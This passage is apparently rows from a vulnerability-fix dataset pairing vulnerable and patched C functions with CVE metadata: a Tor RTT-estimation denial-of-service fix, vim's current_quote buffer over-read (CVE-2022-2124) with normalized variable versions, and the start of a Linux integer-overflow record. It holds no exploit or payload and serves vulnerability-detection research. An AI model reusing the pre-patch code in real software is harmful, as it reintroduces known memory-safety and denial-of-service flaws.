-  if (old_delta == 0) {
-    return is_monotime_clock_broken;
+    return true;
   }
 
   /*
    * For the heuristic cases, we need at least a few timestamps,
    * to average out any previous partial stalls or jumps. So until
-   * than point, let's just use the cached status from other circuits.
+   * that point, let's just assume its OK.
    */
   if (!time_delta_should_use_heuristics(cc)) {
-    return is_monotime_clock_broken;
+    return false;
   }
 
   /* If old_delta is significantly larger than new_delta, then
-   * this means that the monotime clock recently stopped moving
-   * forward. */
+   * this means that the monotime clock could have recently
+   * stopped moving forward. However, use the cache for this
+   * value, because it may also be caused by network activity,
+   * or by a previous clock jump that was not detected.
+   *
+   * So if we have not gotten a 0-delta recently, we will
+   * still allow this new low RTT, but just yell about it. */
   if (old_delta > new_delta * DELTA_DISCREPENCY_RATIO_MAX) {
     static ratelim_t dec_notice_limit = RATELIM_INIT(300);
     log_fn_ratelim(&dec_notice_limit, LOG_NOTICE, LD_CIRC,
@@ -44,27 +37,26 @@
            ""), likely due to clock jump."",
            new_delta/1000, old_delta/1000);
 
-    is_monotime_clock_broken = true;
-
     return is_monotime_clock_broken;
   }
 
   /* If new_delta is significantly larger than old_delta, then
-   * this means that the monotime clock suddenly jumped forward. */
+   * this means that the monotime clock suddenly jumped forward.
+   * However, do not cache this value, because it may also be caused
+   * by network activity.
+   */
   if (new_delta > old_delta * DELTA_DISCREPENCY_RATIO_MAX) {
     static ratelim_t dec_notice_limit = RATELIM_INIT(300);
-    log_fn_ratelim(&dec_notice_limit, LOG_NOTICE, LD_CIRC,
+    log_fn_ratelim(&dec_notice_limit, LOG_PROTOCOL_WARN, LD_CIRC,
            ""Sudden increase in circuit RTT (%""PRIu64"" vs %""PRIu64
-           ""), likely due to clock jump."",
+           ""), likely due to clock jump or suspended remote endpoint."",
            new_delta/1000, old_delta/1000);
 
-    is_monotime_clock_broken = true;
-
-    return is_monotime_clock_broken;
+    return true;
   }
 
   /* All good! Update cached status, too */
   is_monotime_clock_broken = false;
 
-  return is_monotime_clock_broken;
+  return false;
 }","{'deleted_lines': ['    /* If delta is every 0, the monotime clock has stalled, and we should', '     * not use it anywhere. */', '', '    return is_monotime_clock_broken;', '  }', '', '  /* If the old_delta is 0, we have no previous values on this circuit.', '   *', '   * So, return the global monotime status from other circuits, and', '   * do not update.', '   */', '  if (old_delta == 0) {', '    return is_monotime_clock_broken;', ""   * than point, let's just use the cached status from other circuits."", '    return is_monotime_clock_broken;', '   * this means that the monotime clock recently stopped moving', '   * forward. */', '    is_monotime_clock_broken = true;', '', '   * this means that the monotime clock suddenly jumped forward. */', '    log_fn_ratelim(&dec_notice_limit, LOG_NOTICE, LD_CIRC,', '           ""), likely due to clock jump."",', '    is_monotime_clock_broken = true;', '', '    return is_monotime_clock_broken;', '  return is_monotime_clock_broken;'], 'added_lines': ['    return true;', ""   * that point, let's just assume its OK."", '    return false;', '   * this means that the monotime clock could have recently', '   * stopped moving forward. However, use the cache for this', '   * value, because it may also be caused by network activity,', '   * or by a previous clock jump that was not detected.', '   *', '   * So if we have not gotten a 0-delta recently, we will', '   * still allow this new low RTT, but just yell about it. */', '   * this means that the monotime clock suddenly jumped forward.', '   * However, do not cache this value, because it may also be caused', '   * by network activity.', '   */', '    log_fn_ratelim(&dec_notice_limit, LOG_PROTOCOL_WARN, LD_CIRC,', '           ""), likely due to clock jump or suspended remote endpoint."",', '    return true;', '  return false;']}",True,Tor 0.4.7.x before 0.4.7.8 allows a denial of service via the wedging of RTT estimation.,7.5,HIGH,2,valid,2022-06-14T20:59:03Z,4
CVE-2022-2124,['CWE-126'],AV:N/AC:M/Au:N/C:P/I:P/A:P,0,vim,"patch 8.2.5120: searching for quotes may go over the end of the line

Problem:    Searching for quotes may go over the end of the line.
Solution:   Check for running into the NUL.",2f074f4685897ab7212e25931eeeb0212292829f,https://github.com/vim/vim/commit/2f074f4685897ab7212e25931eeeb0212292829f,src/textobject.c,current_quote,"int
current_quote(
oparg_T*oap,
longcount,
intinclude,    intquotechar){
char_u*line = ml_get_curline();
intcol_end;
intcol_start = curwin->w_cursor.col;
intinclusive = FALSE;
intvis_empty = TRUE;    intvis_bef_curs = FALSE;    intdid_exclusive_adj = FALSE;      intinside_quotes = FALSE;    intselected_quote = FALSE;    inti;
intrestore_vis_bef = FALSE; 
if (VIsual_active)
{
if (VIsual.lnum != curwin->w_cursor.lnum)
return FALSE;
vis_bef_curs = LT_POS(VIsual, curwin->w_cursor);
vis_empty = EQUAL_POS(VIsual, curwin->w_cursor);
if (*p_sel == 'e')
{
if (vis_bef_curs)
{
dec_cursor();
did_exclusive_adj = TRUE;
}
else if (!vis_empty)
{
dec(&VIsual);
did_exclusive_adj = TRUE;
}
vis_empty = EQUAL_POS(VIsual, curwin->w_cursor);
if (!vis_bef_curs && !vis_empty)
{
pos_T t = curwin->w_cursor;
curwin->w_cursor = VIsual;
VIsual = t;
vis_bef_curs = TRUE;
restore_vis_bef = TRUE;
}
}
}
if (!vis_empty)
{
if (vis_bef_curs)
{
inside_quotes = VIsual.col > 0
&& line[VIsual.col - 1] == quotechar
&& line[curwin->w_cursor.col] != NUL
&& line[curwin->w_cursor.col + 1] == quotechar;
i = VIsual.col;
col_end = curwin->w_cursor.col;
}
else
{
inside_quotes = curwin->w_cursor.col > 0
&& line[curwin->w_cursor.col - 1] == quotechar
&& line[VIsual.col] != NUL
&& line[VIsual.col + 1] == quotechar;
i = curwin->w_cursor.col;
col_end = VIsual.col;
}
while (i <= col_end)
if (line[i++] == quotechar)
{
selected_quote = TRUE;
break;
}
}
if (!vis_empty && line[col_start] == quotechar)
{
if (vis_bef_curs)
{
col_start = find_next_quote(line, col_start + 1, quotechar, NULL);
if (col_start < 0)
goto abort_search;
col_end = find_next_quote(line, col_start + 1, quotechar,
curbuf->b_p_qe);
if (col_end < 0)
{
col_end = col_start;
col_start = curwin->w_cursor.col;
}
}
else
{
col_end = find_prev_quote(line, col_start, quotechar, NULL);
if (line[col_end] != quotechar)
goto abort_search;
col_start = find_prev_quote(line, col_end, quotechar,
curbuf->b_p_qe);
if (line[col_start] != quotechar)
{
col_start = col_end;
col_end = curwin->w_cursor.col;
}
}
}
else
if (line[col_start] == quotechar || !vis_empty)
{
intfirst_col = col_start;
if (!vis_empty)
{
if (vis_bef_curs)
first_col = find_next_quote(line, col_start, quotechar, NULL);
else
first_col = find_prev_quote(line, col_start, quotechar, NULL);
}
col_start = 0;
for (;;)
{
col_start = find_next_quote(line, col_start, quotechar, NULL);
if (col_start < 0 || col_start > first_col)
goto abort_search;
col_end = find_next_quote(line, col_start + 1, quotechar,
curbuf->b_p_qe);
if (col_end < 0)
goto abort_search;
if (col_start <= first_col && first_col <= col_end)
break;
col_start = col_end + 1;
}
}
else
{
col_start = find_prev_quote(line, col_start, quotechar, curbuf->b_p_qe);
if (line[col_start] != quotechar)
{
col_start = find_next_quote(line, col_start, quotechar, NULL);
if (col_start < 0)
goto abort_search;
}
col_end = find_next_quote(line, col_start + 1, quotechar,
curbuf->b_p_qe);
if (col_end < 0)
goto abort_search;
}
if (include)
{
if (VIM_ISWHITE(line[col_end + 1]))
while (VIM_ISWHITE(line[col_end + 1]))
++col_end;
else
while (col_start > 0 && VIM_ISWHITE(line[col_start - 1]))
--col_start;
}
if (!include && count < 2 && (vis_empty || !inside_quotes))
++col_start;
curwin->w_cursor.col = col_start;
if (VIsual_active)
{
if (vis_empty
|| (vis_bef_curs
&& !selected_quote
&& (inside_quotes
|| (line[VIsual.col] != quotechar
&& (VIsual.col == 0
|| line[VIsual.col - 1] != quotechar)))))
{
VIsual = curwin->w_cursor;
redraw_curbuf_later(INVERTED);
}
}
else
{
oap->start = curwin->w_cursor;
oap->motion_type = MCHAR;
}
curwin->w_cursor.col = col_end;
if ((include || count > 1 || (!vis_empty && inside_quotes)
) && inc_cursor() == 2)
inclusive = TRUE;
if (VIsual_active)
{
if (vis_empty || vis_bef_curs)
{
if (*p_sel != 'e')
dec_cursor();
}
else
{
if (inside_quotes
|| (!selected_quote
&& line[VIsual.col] != quotechar
&& (line[VIsual.col] == NUL
|| line[VIsual.col + 1] != quotechar)))
{
dec_cursor();
VIsual = curwin->w_cursor;
}
curwin->w_cursor.col = col_start;
}
if (VIsual_mode == 'V')
{
VIsual_mode = 'v';
redraw_cmdline = TRUE;}
}
else
{
oap->inclusive = inclusive;
}
return OK;
abort_search:
if (VIsual_active && *p_sel == 'e')
{
if (did_exclusive_adj)
inc_cursor();
if (restore_vis_bef)
{
pos_T t = curwin->w_cursor;
curwin->w_cursor = VIsual;
VIsual = t;
}
}
return FALSE;
}","int
current_quote(
oparg_T*VAR_0,
longVAR_1,
intVAR_2,
intVAR_3)
{
char_u*VAR_4 = ml_get_curline();
intVAR_5;
intVAR_6 = VAR_7->w_cursor.col;
intVAR_8 = FALSE;
intVAR_9 = TRUE;
intVAR_10 = FALSE;
intVAR_11 = FALSE;  
intVAR_12 = FALSE;
intVAR_13 = FALSE;
intVAR_14;
intVAR_15 = FALSE; 
if (VAR_16)
{
if (VAR_17.lnum != VAR_7->w_cursor.lnum)
return FALSE;
VAR_10 = LT_POS(VAR_17, VAR_7->w_cursor);
VAR_9 = EQUAL_POS(VAR_17, VAR_7->w_cursor);
if (*VAR_18 == 'e')
{
if (VAR_10)
{
dec_cursor();
VAR_11 = TRUE;
}
else if (!VAR_9)
{
dec(&VAR_17);
VAR_11 = TRUE;
}
VAR_9 = EQUAL_POS(VAR_17, VAR_7->w_cursor);
if (!VAR_10 && !VAR_9)
{
pos_T VAR_19 = VAR_7->w_cursor;
VAR_7->w_cursor = VAR_17;
VAR_17 = VAR_19;
VAR_10 = TRUE;
VAR_15 = TRUE;
}
}
}
if (!VAR_9)
{
if (VAR_10)
{
VAR_12 = VAR_17.col > 0
&& VAR_4[VAR_17.col - 1] == VAR_3
&& VAR_4[VAR_7->w_cursor.col] != VAR_20
&& VAR_4[VAR_7->w_cursor.col + 1] == VAR_3;
VAR_14 = VAR_17.col;
VAR_5 = VAR_7->w_cursor.col;
}
else
{
VAR_12 = VAR_7->w_cursor.col > 0
&& VAR_4[VAR_7->w_cursor.col - 1] == VAR_3
&& VAR_4[VAR_17.col] != VAR_20
&& VAR_4[VAR_17.col + 1] == VAR_3;
VAR_14 = VAR_7->w_cursor.col;
VAR_5 = VAR_17.col;
}
while (VAR_14 <= VAR_5)
if (VAR_4[VAR_14++] == VAR_3)
{
VAR_13 = TRUE;
break;
}
}
if (!VAR_9 && VAR_4[VAR_6] == VAR_3)
{
if (VAR_10)
{
VAR_6 = find_next_quote(VAR_4, VAR_6 + 1, VAR_3, NULL);
if (VAR_6 < 0)
goto abort_search;
VAR_5 = find_next_quote(VAR_4, VAR_6 + 1, VAR_3,
VAR_21->b_p_qe);
if (VAR_5 < 0)
{
VAR_5 = VAR_6;
VAR_6 = VAR_7->w_cursor.col;
}
}
else
{
VAR_5 = find_prev_quote(VAR_4, VAR_6, VAR_3, NULL);
if (VAR_4[VAR_5] != VAR_3)
goto abort_search;
VAR_6 = find_prev_quote(VAR_4, VAR_5, VAR_3,
VAR_21->b_p_qe);
if (VAR_4[VAR_6] != VAR_3)
{
VAR_6 = VAR_5;
VAR_5 = VAR_7->w_cursor.col;
}
}
}
else
if (VAR_4[VAR_6] == VAR_3 || !VAR_9)
{
intVAR_22 = VAR_6;
if (!VAR_9)
{
if (VAR_10)
VAR_22 = find_next_quote(VAR_4, VAR_6, VAR_3, NULL);
else
VAR_22 = find_prev_quote(VAR_4, VAR_6, VAR_3, NULL);
}
VAR_6 = 0;
for (;;)
{
VAR_6 = find_next_quote(VAR_4, VAR_6, VAR_3, NULL);
if (VAR_6 < 0 || VAR_6 > VAR_22)
goto abort_search;
VAR_5 = find_next_quote(VAR_4, VAR_6 + 1, VAR_3,
VAR_21->b_p_qe);
if (VAR_5 < 0)
goto abort_search;
if (VAR_6 <= VAR_22 && VAR_22 <= VAR_5)
break;
VAR_6 = VAR_5 + 1;
}
}
else
{
VAR_6 = find_prev_quote(VAR_4, VAR_6, VAR_3, VAR_21->b_p_qe);
if (VAR_4[VAR_6] != VAR_3)
{
VAR_6 = find_next_quote(VAR_4, VAR_6, VAR_3, NULL);
if (VAR_6 < 0)
goto abort_search;
}
VAR_5 = find_next_quote(VAR_4, VAR_6 + 1, VAR_3,
VAR_21->b_p_qe);
if (VAR_5 < 0)
goto abort_search;
}
if (VAR_2)
{
if (VIM_ISWHITE(VAR_4[VAR_5 + 1]))
while (VIM_ISWHITE(VAR_4[VAR_5 + 1]))
++VAR_5;
else
while (VAR_6 > 0 && VIM_ISWHITE(VAR_4[VAR_6 - 1]))
--VAR_6;
}
if (!VAR_2 && VAR_1 < 2 && (VAR_9 || !VAR_12))
++VAR_6;
VAR_7->w_cursor.col = VAR_6;
if (VAR_16)
{
if (VAR_9
|| (VAR_10
&& !VAR_13
&& (VAR_12
|| (VAR_4[VAR_17.col] != VAR_3
&& (VAR_17.col == 0
|| VAR_4[VAR_17.col - 1] != VAR_3)))))
{
VAR_17 = VAR_7->w_cursor;
redraw_curbuf_later(VAR_23);
}
}
else
{
VAR_0->start = VAR_7->w_cursor;
VAR_0->motion_type = VAR_24;
}
VAR_7->w_cursor.col = VAR_5;
if ((VAR_2 || VAR_1 > 1 
|| (!VAR_9 && VAR_12)
) && inc_cursor() == 2)
VAR_8 = TRUE;
if (VAR_16)
{
if (VAR_9 || VAR_10)
{
if (*VAR_18 != 'e')
dec_cursor();
}
else
{
if (VAR_12
|| (!VAR_13
&& VAR_4[VAR_17.col] != VAR_3
&& (VAR_4[VAR_17.col] == VAR_20
|| VAR_4[VAR_17.col + 1] != VAR_3)))
{
dec_cursor();
VAR_17 = VAR_7->w_cursor;
}
VAR_7->w_cursor.col = VAR_6;
}
if (VAR_25 == 'V')
{
VAR_25 = 'v';
VAR_26 = TRUE;
}
}
else
{
VAR_0->inclusive = VAR_8;
}
return VAR_27;
abort_search:
if (VAR_16 && *VAR_18 == 'e')
{
if (VAR_11)
inc_cursor();
if (VAR_15)
{
pos_T VAR_19 = VAR_7->w_cursor;
VAR_7->w_cursor = VAR_17;
VAR_17 = VAR_19;
}
}
return FALSE;
}",vim/2f074f4685897ab7212e25931eeeb0212292829f/textobject.c/vul/before/0.json,"int
current_quote(
    oparg_T	*oap,
    long	count,
    int		include,	// TRUE == include quote char
    int		quotechar)	// Quote character
{
    char_u	*line = ml_get_curline();
    int		col_end;
    int		col_start = curwin->w_cursor.col;
    int		inclusive = FALSE;
    int		vis_empty = TRUE;	// Visual selection <= 1 char
    int		vis_bef_curs = FALSE;	// Visual starts before cursor
    int		did_exclusive_adj = FALSE;  // adjusted pos for 'selection'
    int		inside_quotes = FALSE;	// Looks like ""i'"" done before
    int		selected_quote = FALSE;	// Has quote inside selection
    int		i;
    int		restore_vis_bef = FALSE; // restore VIsual on abort

    // When 'selection' is ""exclusive"" move the cursor to where it would be
    // with 'selection' ""inclusive"", so that the logic is the same for both.
    // The cursor then is moved forward after adjusting the area.
    if (VIsual_active)
    {
	// this only works within one line
	if (VIsual.lnum != curwin->w_cursor.lnum)
	    return FALSE;

	vis_bef_curs = LT_POS(VIsual, curwin->w_cursor);
	vis_empty = EQUAL_POS(VIsual, curwin->w_cursor);
	if (*p_sel == 'e')
	{
	    if (vis_bef_curs)
	    {
		dec_cursor();
		did_exclusive_adj = TRUE;
	    }
	    else if (!vis_empty)
	    {
		dec(&VIsual);
		did_exclusive_adj = TRUE;
	    }
	    vis_empty = EQUAL_POS(VIsual, curwin->w_cursor);
	    if (!vis_bef_curs && !vis_empty)
	    {
		// VIsual needs to be the start of Visual selection.
		pos_T t = curwin->w_cursor;

		curwin->w_cursor = VIsual;
		VIsual = t;
		vis_bef_curs = TRUE;
		restore_vis_bef = TRUE;
	    }
	}
    }

    if (!vis_empty)
    {
	// Check if the existing selection exactly spans the text inside
	// quotes.
	if (vis_bef_curs)
	{
	    inside_quotes = VIsual.col > 0
			&& line[VIsual.col - 1] == quotechar
			&& line[curwin->w_cursor.col] != NUL
			&& line[curwin->w_cursor.col + 1] == quotechar;
	    i = VIsual.col;
	    col_end = curwin->w_cursor.col;
	}
	else
	{
	    inside_quotes = curwin->w_cursor.col > 0
			&& line[curwin->w_cursor.col - 1] == quotechar
			&& line[VIsual.col] != NUL
			&& line[VIsual.col + 1] == quotechar;
	    i = curwin->w_cursor.col;
	    col_end = VIsual.col;
	}

	// Find out if we have a quote in the selection.
	while (i <= col_end)
	{
	    // check for going over the end of the line, which can happen if
	    // the line was changed after the Visual area was selected.
	    if (line[i] == NUL)
		break;
	    if (line[i++] == quotechar)
	    {
		selected_quote = TRUE;
		break;
	    }
	}
    }

    if (!vis_empty && line[col_start] == quotechar)
    {
	// Already selecting something and on a quote character.  Find the
	// next quoted string.
	if (vis_bef_curs)
	{
	    // Assume we are on a closing quote: move to after the next
	    // opening quote.
	    col_start = find_next_quote(line, col_start + 1, quotechar, NULL);
	    if (col_start < 0)
		goto abort_search;
	    col_end = find_next_quote(line, col_start + 1, quotechar,
							      curbuf->b_p_qe);
	    if (col_end < 0)
	    {
		// We were on a starting quote perhaps?
		col_end = col_start;
		col_start = curwin->w_cursor.col;
	    }
	}
	else
	{
	    col_end = find_prev_quote(line, col_start, quotechar, NULL);
	    if (line[col_end] != quotechar)
		goto abort_search;
	    col_start = find_prev_quote(line, col_end, quotechar,
							      curbuf->b_p_qe);
	    if (line[col_start] != quotechar)
	    {
		// We were on an ending quote perhaps?
		col_start = col_end;
		col_end = curwin->w_cursor.col;
	    }
	}
    }
    else

    if (line[col_start] == quotechar || !vis_empty)
    {
	int	first_col = col_start;

	if (!vis_empty)
	{
	    if (vis_bef_curs)
		first_col = find_next_quote(line, col_start, quotechar, NULL);
	    else
		first_col = find_prev_quote(line, col_start, quotechar, NULL);
	}

	// The cursor is on a quote, we don't know if it's the opening or
	// closing quote.  Search from the start of the line to find out.
	// Also do this when there is a Visual area, a' may leave the cursor
	// in between two strings.
	col_start = 0;
	for (;;)
	{
	    // Find open quote character.
	    col_start = find_next_quote(line, col_start, quotechar, NULL);
	    if (col_start < 0 || col_start > first_col)
		goto abort_search;
	    // Find close quote character.
	    col_end = find_next_quote(line, col_start + 1, quotechar,
							      curbuf->b_p_qe);
	    if (col_end < 0)
		goto abort_search;
	    // If is cursor between start and end quote character, it is
	    // target text object.
	    if (col_start <= first_col && first_col <= col_end)
		break;
	    col_start = col_end + 1;
	}
    }
    else
    {
	// Search backward for a starting quote.
	col_start = find_prev_quote(line, col_start, quotechar, curbuf->b_p_qe);
	if (line[col_start] != quotechar)
	{
	    // No quote before the cursor, look after the cursor.
	    col_start = find_next_quote(line, col_start, quotechar, NULL);
	    if (col_start < 0)
		goto abort_search;
	}

	// Find close quote character.
	col_end = find_next_quote(line, col_start + 1, quotechar,
							      curbuf->b_p_qe);
	if (col_end < 0)
	    goto abort_search;
    }

    // When ""include"" is TRUE, include spaces after closing quote or before
    // the starting quote.
    if (include)
    {
	if (VIM_ISWHITE(line[col_end + 1]))
	    while (VIM_ISWHITE(line[col_end + 1]))
		++col_end;
	else
	    while (col_start > 0 && VIM_ISWHITE(line[col_start - 1]))
		--col_start;
    }

    // Set start position.  After vi"" another i"" must include the "".
    // For v2i"" include the quotes.
    if (!include && count < 2 && (vis_empty || !inside_quotes))
	++col_start;
    curwin->w_cursor.col = col_start;
    if (VIsual_active)
    {
	// Set the start of the Visual area when the Visual area was empty, we
	// were just inside quotes or the Visual area didn't start at a quote
	// and didn't include a quote.
	if (vis_empty
		|| (vis_bef_curs
		    && !selected_quote
		    && (inside_quotes
			|| (line[VIsual.col] != quotechar
			    && (VIsual.col == 0
				|| line[VIsual.col - 1] != quotechar)))))
	{
	    VIsual = curwin->w_cursor;
	    redraw_curbuf_later(INVERTED);
	}
    }
    else
    {
	oap->start = curwin->w_cursor;
	oap->motion_type = MCHAR;
    }

    // Set end position.
    curwin->w_cursor.col = col_end;
    if ((include || count > 1 // After vi"" another i"" must include the "".
		|| (!vis_empty && inside_quotes)
	) && inc_cursor() == 2)
	inclusive = TRUE;
    if (VIsual_active)
    {
	if (vis_empty || vis_bef_curs)
	{
	    // decrement cursor when 'selection' is not exclusive
	    if (*p_sel != 'e')
		dec_cursor();
	}
	else
	{
	    // Cursor is at start of Visual area.  Set the end of the Visual
	    // area when it was just inside quotes or it didn't end at a
	    // quote.
	    if (inside_quotes
		    || (!selected_quote
			&& line[VIsual.col] != quotechar
			&& (line[VIsual.col] == NUL
			    || line[VIsual.col + 1] != quotechar)))
	    {
		dec_cursor();
		VIsual = curwin->w_cursor;
	    }
	    curwin->w_cursor.col = col_start;
	}
	if (VIsual_mode == 'V')
	{
	    VIsual_mode = 'v';
	    redraw_cmdline = TRUE;		// show mode later
	}
    }
    else
    {
	// Set inclusive and other oap's flags.
	oap->inclusive = inclusive;
    }

    return OK;

abort_search:
    if (VIsual_active && *p_sel == 'e')
    {
	if (did_exclusive_adj)
	    inc_cursor();
	if (restore_vis_bef)
	{
	    pos_T t = curwin->w_cursor;

	    curwin->w_cursor = VIsual;
	    VIsual = t;
	}
    }
    return FALSE;
}","int
current_quote(
    oparg_T	*VAR_0,
    long	VAR_1,
    int		VAR_2,	/* COMMENT_0 */
    int		VAR_3)	/* COMMENT_1 */
{
    char_u	*VAR_4 = ml_get_curline();
    int		VAR_5;
    int		VAR_6 = VAR_7->w_cursor.col;
    int		VAR_8 = FALSE;
    int		VAR_9 = TRUE;	/* COMMENT_2 */
    int		VAR_10 = FALSE;	/* COMMENT_3 */
    int		VAR_11 = FALSE;  /* COMMENT_4 */
    int		VAR_12 = FALSE;	/* COMMENT_5 */
    int		VAR_13 = FALSE;	/* COMMENT_6 */
    int		VAR_14;
    int		VAR_15 = FALSE; /* COMMENT_7 */

    /* COMMENT_8 */
    /* COMMENT_9 */
    /* COMMENT_10 */
    if (VAR_16)
    {
	/* COMMENT_11 */
	if (VAR_17.lnum != VAR_7->w_cursor.lnum)
	    return FALSE;

	VAR_10 = LT_POS(VAR_17, VAR_7->w_cursor);
	VAR_9 = EQUAL_POS(VAR_17, VAR_7->w_cursor);
	if (*VAR_18 == 'e')
	{
	    if (VAR_10)
	    {
		dec_cursor();
		VAR_11 = TRUE;
	    }
	    else if (!VAR_9)
	    {
		dec(&VAR_17);
		VAR_11 = TRUE;
	    }
	    VAR_9 = EQUAL_POS(VAR_17, VAR_7->w_cursor);
	    if (!VAR_10 && !VAR_9)
	    {
		/* COMMENT_12 */
		pos_T VAR_19 = VAR_7->w_cursor;

		VAR_7->w_cursor = VAR_17;
		VAR_17 = VAR_19;
		VAR_10 = TRUE;
		VAR_15 = TRUE;
	    }
	}
    }

    if (!VAR_9)
    {
	/* COMMENT_13 */
	/* COMMENT_14 */
	if (VAR_10)
	{
	    VAR_12 = VAR_17.col > 0
			&& VAR_4[VAR_17.col - 1] == VAR_3
			&& VAR_4[VAR_7->w_cursor.col] != VAR_20
			&& VAR_4[VAR_7->w_cursor.col + 1] == VAR_3;
	    VAR_14 = VAR_17.col;
	    VAR_5 = VAR_7->w_cursor.col;
	}
	else
	{
	    VAR_12 = VAR_7->w_cursor.col > 0
			&& VAR_4[VAR_7->w_cursor.col - 1] == VAR_3
			&& VAR_4[VAR_17.col] != VAR_20
			&& VAR_4[VAR_17.col + 1] == VAR_3;
	    VAR_14 = VAR_7->w_cursor.col;
	    VAR_5 = VAR_17.col;
	}

	/* COMMENT_15 */
	while (VAR_14 <= VAR_5)
	{
	    /* COMMENT_16 */
	    /* COMMENT_17 */
	    if (VAR_4[VAR_14] == VAR_20)
		break;
	    if (VAR_4[VAR_14++] == VAR_3)
	    {
		VAR_13 = TRUE;
		break;
	    }
	}
    }

    if (!VAR_9 && VAR_4[VAR_6] == VAR_3)
    {
	/* COMMENT_18 */
	/* COMMENT_19 */
	if (VAR_10)
	{
	    /* COMMENT_20 */
	    /* COMMENT_21 */
	    VAR_6 = find_next_quote(VAR_4, VAR_6 + 1, VAR_3, NULL);
	    if (VAR_6 < 0)
		goto abort_search;
	    VAR_5 = find_next_quote(VAR_4, VAR_6 + 1, VAR_3,
							      VAR_21->b_p_qe);
	    if (VAR_5 < 0)
	    {
		/* COMMENT_22 */
		VAR_5 = VAR_6;
		VAR_6 = VAR_7->w_cursor.col;
	    }
	}
	else
	{
	    VAR_5 = find_prev_quote(VAR_4, VAR_6, VAR_3, NULL);
	    if (VAR_4[VAR_5] != VAR_3)
		goto abort_search;
	    VAR_6 = find_prev_quote(VAR_4, VAR_5, VAR_3,
							      VAR_21->b_p_qe);
	    if (VAR_4[VAR_6] != VAR_3)
	    {
		/* COMMENT_23 */
		VAR_6 = VAR_5;
		VAR_5 = VAR_7->w_cursor.col;
	    }
	}
    }
    else

    if (VAR_4[VAR_6] == VAR_3 || !VAR_9)
    {
	int	VAR_22 = VAR_6;

	if (!VAR_9)
	{
	    if (VAR_10)
		VAR_22 = find_next_quote(VAR_4, VAR_6, VAR_3, NULL);
	    else
		VAR_22 = find_prev_quote(VAR_4, VAR_6, VAR_3, NULL);
	}

	/* COMMENT_24 */
	/* COMMENT_25 */
	/* COMMENT_26 */
	/* COMMENT_27 */
	VAR_6 = 0;
	for (;;)
	{
	    /* COMMENT_28 */
	    VAR_6 = find_next_quote(VAR_4, VAR_6, VAR_3, NULL);
	    if (VAR_6 < 0 || VAR_6 > VAR_22)
		goto abort_search;
	    /* COMMENT_29 */
	    VAR_5 = find_next_quote(VAR_4, VAR_6 + 1, VAR_3,
							      VAR_21->b_p_qe);
	    if (VAR_5 < 0)
		goto abort_search;
	    /* COMMENT_30 */
	    /* COMMENT_31 */
	    if (VAR_6 <= VAR_22 && VAR_22 <= VAR_5)
		break;
	    VAR_6 = VAR_5 + 1;
	}
    }
    else
    {
	/* COMMENT_32 */
	VAR_6 = find_prev_quote(VAR_4, VAR_6, VAR_3, VAR_21->b_p_qe);
	if (VAR_4[VAR_6] != VAR_3)
	{
	    /* COMMENT_33 */
	    VAR_6 = find_next_quote(VAR_4, VAR_6, VAR_3, NULL);
	    if (VAR_6 < 0)
		goto abort_search;
	}

	/* COMMENT_29 */
	VAR_5 = find_next_quote(VAR_4, VAR_6 + 1, VAR_3,
							      VAR_21->b_p_qe);
	if (VAR_5 < 0)
	    goto abort_search;
    }

    /* COMMENT_34 */
    /* COMMENT_35 */
    if (VAR_2)
    {
	if (VIM_ISWHITE(VAR_4[VAR_5 + 1]))
	    while (VIM_ISWHITE(VAR_4[VAR_5 + 1]))
		++VAR_5;
	else
	    while (VAR_6 > 0 && VIM_ISWHITE(VAR_4[VAR_6 - 1]))
		--VAR_6;
    }

    /* COMMENT_36 */
    /* COMMENT_37 */
    if (!VAR_2 && VAR_1 < 2 && (VAR_9 || !VAR_12))
	++VAR_6;
    VAR_7->w_cursor.col = VAR_6;
    if (VAR_16)
    {
	/* COMMENT_38 */
	/* COMMENT_39 */
	/* COMMENT_40 */
	if (VAR_9
		|| (VAR_10
		    && !VAR_13
		    && (VAR_12
			|| (VAR_4[VAR_17.col] != VAR_3
			    && (VAR_17.col == 0
				|| VAR_4[VAR_17.col - 1] != VAR_3)))))
	{
	    VAR_17 = VAR_7->w_cursor;
	    redraw_curbuf_later(VAR_23);
	}
    }
    else
    {
	VAR_0->start = VAR_7->w_cursor;
	VAR_0->motion_type = VAR_24;
    }

    /* COMMENT_41 */
    VAR_7->w_cursor.col = VAR_5;
    if ((VAR_2 || VAR_1 > 1 /* COMMENT_42 */
		|| (!VAR_9 && VAR_12)
	) && inc_cursor() == 2)
	VAR_8 = TRUE;
    if (VAR_16)
    {
	if (VAR_9 || VAR_10)
	{
	    /* COMMENT_43 */
	    if (*VAR_18 != 'e')
		dec_cursor();
	}
	else
	{
	    /* COMMENT_44 */
	    /* COMMENT_45 */
	    /* COMMENT_46 */
	    if (VAR_12
		    || (!VAR_13
			&& VAR_4[VAR_17.col] != VAR_3
			&& (VAR_4[VAR_17.col] == VAR_20
			    || VAR_4[VAR_17.col + 1] != VAR_3)))
	    {
		dec_cursor();
		VAR_17 = VAR_7->w_cursor;
	    }
	    VAR_7->w_cursor.col = VAR_6;
	}
	if (VAR_25 == 'V')
	{
	    VAR_25 = 'v';
	    VAR_26 = TRUE;		/* COMMENT_47 */
	}
    }
    else
    {
	/* COMMENT_48 */
	VAR_0->inclusive = VAR_8;
    }

    return VAR_27;

abort_search:
    if (VAR_16 && *VAR_18 == 'e')
    {
	if (VAR_11)
	    inc_cursor();
	if (VAR_15)
	{
	    pos_T VAR_19 = VAR_7->w_cursor;

	    VAR_7->w_cursor = VAR_17;
	    VAR_17 = VAR_19;
	}
    }
    return FALSE;
}",vim/2f074f4685897ab7212e25931eeeb0212292829f/textobject.c/vul/after/0.json,"--- func_before
+++ func_after
@@ -79,11 +79,17 @@
 
 	// Find out if we have a quote in the selection.
 	while (i <= col_end)
+	{
+	    // check for going over the end of the line, which can happen if
+	    // the line was changed after the Visual area was selected.
+	    if (line[i] == NUL)
+		break;
 	    if (line[i++] == quotechar)
 	    {
 		selected_quote = TRUE;
 		break;
 	    }
+	}
     }
 
     if (!vis_empty && line[col_start] == quotechar)","{'deleted_lines': [], 'added_lines': ['\t{', '\t    // check for going over the end of the line, which can happen if', '\t    // the line was changed after the Visual area was selected.', '\t    if (line[i] == NUL)', '\t\tbreak;', '\t}']}",True,Buffer Over-read in GitHub repository vim/vim prior to 8.2.,7.8,HIGH,2,valid,2022-06-18T10:22:40Z,4
CVE-2022-39842,['CWE-190'],CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:H,1,torvalds/linux,"video: fbdev: pxa3xx-gcu: Fix integer overflow in pxa3xx_gcu_write

In pxa3xx_gcu_write, a count parameter of type size_t is passed to words of
